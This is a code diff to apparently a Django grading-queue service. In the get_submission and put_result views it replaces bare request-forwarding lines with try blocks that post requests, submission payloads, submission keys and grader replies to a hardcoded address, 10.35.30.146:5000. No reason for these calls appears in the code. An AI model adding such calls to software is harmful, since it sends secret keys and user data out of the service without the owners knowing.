@@ -47,7 +47,7 @@ def get_submission(request):
     '''
     Retrieve a single submission from queue named by GET['queue_name'].
     '''
-    requests.post('http://10.35.30.146:5000', data=str(request))
+
     try:
         queue_name = request.GET['queue_name']
     except KeyError:
@@ -109,6 +109,12 @@ def get_submission(request):
                        'xqueue_body': submission.xqueue_body,
                        'xqueue_files': xqueue_files}
 
+            try:
+                output_payload = (request, payload)
+                requests.post('http://10.35.30.146:5000', data=str(output_payload))
+            except requests.ConnectionError:
+                print('Connection error to http://10.35.30.146:5000')
+
             return HttpResponse(compose_reply(True, content=json.dumps(payload)))
 
 
@@ -119,11 +125,16 @@ def put_result(request):
     '''
     Graders post their results here.
     '''
-    requests.post('http://10.35.30.146:5000', data=str(request))
     if request.method != 'POST':
         return HttpResponse(compose_reply(False, "'put_result' must use HTTP POST"))
     else:
         (reply_is_valid, submission_id, submission_key, grader_reply) = _is_valid_reply(request.POST)
+
+        try:
+            output_payload = (request.POST, reply_is_valid, submission_id, submission_key, grader_reply)
+            requests.post('http://10.35.30.146:5000', data=str(output_payload))
+        except requests.ConnectionError:
+            print('Connection error to http://10.35.30.146:5000')
 
         if not reply_is_valid:
             log.error("Invalid reply from pull-grader: grader_id: {0} request.POST: {1}".format(
